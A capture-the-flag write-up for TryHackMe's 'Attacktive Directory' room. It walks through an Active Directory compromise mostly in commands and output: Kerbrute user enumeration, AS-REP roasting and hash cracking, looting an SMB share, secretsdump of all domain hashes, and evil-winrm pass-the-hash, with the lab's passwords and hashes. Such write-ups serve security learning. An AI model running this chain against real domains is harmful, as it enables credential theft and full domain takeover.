# 📝 THM — Attacktive Directory

**Platform:** TryHackMe  
**Room:** Attacktive Directory  
**OS:** Windows — Active Directory  
**Domain:** spookysec.local  
**Attack Path:** Kerbrute → AS-REP Roast → SMB Share → secretsdump → Pass-the-Hash

---

## Machine Info

| Field | Value |
|-------|-------|
| IP | 10.10.x.x (dynamic) |
| Domain | spookysec.local |
| DC Hostname | THM-AD |
| Key Techniques | Kerbrute, AS-REP Roasting, SMB enumeration, secretsdump, PTH |

---

## Environment Setup

```bash
export ip=10.10.x.x
export domain=spookysec.local
echo "$ip spookysec.local THM-AD" >> /etc/hosts
mkdir -p scan enum creds loot

# Download room-provided wordlists
wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt \
  -O enum/userlist.txt
wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt \
  -O creds/passwordlist.txt
```

---

## Phase 1 — Recon

```bash
nmap -sC -sV -oN scan/nmap-quick.txt $ip
```

**Key open ports:**

```
53    DNS
80    HTTP
88    Kerberos
135   RPC
139/445 SMB
389   LDAP
3268  Global Catalog
3389  RDP
# NetBIOS-Domain Name: THM-AD
# Invalid TLD: .local
```

```bash
# SMB enum (no creds) — note domain name
enum4linux-ng $ip
# NetBIOS-Domain Name: THM-AD
```

---

## Phase 2 — Kerbrute User Enumeration

```bash
# Copy kerbrute to working directory
cp /home/kali/Arsenal/ActiveDirectory/Kerbrute/kerbrute .

# Enumerate valid users
sudo ./kerbrute userenum --dc $ip -d $domain enum/userlist.txt | tee enum/raw-kerbrute.txt

# Extract valid usernames
grep "VALID USERNAME" enum/raw-kerbrute.txt | awk -F'@' '{print $1}' | awk '{print $NF}' \
  > enum/users.txt
```

**Notable accounts discovered:**

```
svc-admin     ← service account
backup        ← unique permissions — syncs AD changes
james
robin
darkstar
administrator
```

---

## Phase 3 — AS-REP Roasting

```bash
# Roast valid user list
sudo impacket-GetNPUsers $domain/ -usersfile enum/users.txt \
  -format hashcat -outputfile creds/asrep-hashes.txt -dc-ip $ip -no-pass

# svc-admin is AS-REP roastable:
# $krb5asrep$23$svc-admin@THM-AD@spookysec.local:...
```

```bash
# Crack with room passwordlist
sudo hashcat -m 18200 creds/asrep-hashes.txt creds/passwordlist.txt
# Result: svc-admin : management2005

# Alternative — john
sudo john --wordlist=creds/passwordlist.txt creds/asrep-hashes.txt
```

---

## Phase 4 — SMB Enumeration with Credentials

```bash
export user=svc-admin
export pass=management2005

# List shares
nxc smb $ip -u $user -p $pass --shares
smbclient -L //$ip -U "$domain\\$user%$pass"
```

**Shares discovered:**

```
ADMIN$       → No access
backup       → READ ONLY  ← interesting
C$           → No access
IPC$         → READ ONLY
NETLOGON     → READ ONLY
SYSVOL       → READ ONLY
```

```bash
# Connect to backup share
smbclient //$ip/backup -U "$domain\\$user%$pass"

smb: \> ls
# backup_credentials.txt found

smb: \> get backup_credentials.txt
```

**Contents of backup_credentials.txt:**

```
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
```

```bash
# Decode base64
echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d
# Result: backup@spookysec.local:backup2517860
```

---

## Phase 5 — secretsdump → All Hashes

The `backup` account has **DS-Replication** rights — can dump all AD hashes.

```bash
# Dump all domain hashes
sudo impacket-secretsdump $domain/backup:'backup2517860'@$ip \
  -just-dc-ntlm | tee loot/secretsdump.txt

# Key hashes extracted:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
# svc-admin:1103:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
# backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
```

---

## Phase 6 — Pass-the-Hash → Domain Admin

```bash
# Pass-the-Hash with Administrator NTLM hash
evil-winrm -i $ip -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami
thm-ad\administrator

# Collect flags from each user desktop
*Evil-WinRM* PS C:\> type C:\Users\svc-admin\Desktop\user.txt.txt
*Evil-WinRM* PS C:\> type C:\Users\backup\Desktop\PrivEsc.txt
*Evil-WinRM* PS C:\> type C:\Users\Administrator\Desktop\root.txt
```

---

## Attack Chain Summary

```
nmap → port 88 (Kerberos), 445 (SMB), 389 (LDAP) open
  ↓
kerbrute userenum → svc-admin + backup confirmed valid
  ↓
AS-REP roast → svc-admin hash → crack → management2005
  ↓
SMB → backup share → backup_credentials.txt → base64 decode
  ↓
backup : backup2517860 (has DS-Replication rights)
  ↓
secretsdump → all NTLM hashes including Administrator
  ↓
evil-winrm PTH → Administrator shell → root.txt
```

---

## Key Takeaways

```
1. Service accounts (svc-admin) often have DontReqPreAuth set — always AS-REP roast
2. Readable SMB shares can contain encoded credentials — always decode and check
3. Backup/sync accounts often have DS-Replication rights → treat as DA equivalent
4. PTH with evil-winrm is the cleanest method when WinRM (5985) is open
```

---

**MITRE ATT&CK:** T1558.004 (AS-REP Roasting) · T1039 (Data from Network Shared Drive) · T1003.003 (NTDS) · T1550.002 (Pass the Hash)

[← Back to Writeups](README.md)
